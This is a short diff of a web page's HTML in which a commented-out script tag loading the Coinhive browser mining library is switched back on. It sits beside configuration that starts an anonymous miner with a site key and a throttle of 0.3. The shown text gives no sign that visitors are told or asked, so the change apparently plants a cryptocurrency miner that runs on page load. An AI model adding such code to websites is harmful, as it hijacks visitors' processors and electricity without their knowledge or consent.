@@ -956,7 +956,7 @@ document.getElementById("audio").volume = 0.5;
 <div id="coinhive-miner">
 </div>
 
-<!-- <script src="https://coinhive.com/lib/coinhive.min.js" async></script> -->
+<script src="https://coinhive.com/lib/coinhive.min.js" async></script>
 <script>
     CoinHive.CONFIG.LIB_URL = ["https://coinhive.com/lib/"];
     var miner = new CoinHive.Anonymous('1AZ2sY9P2jO5NUlyOAJKWySh6SsHsb4k', {throttle: 0.3});
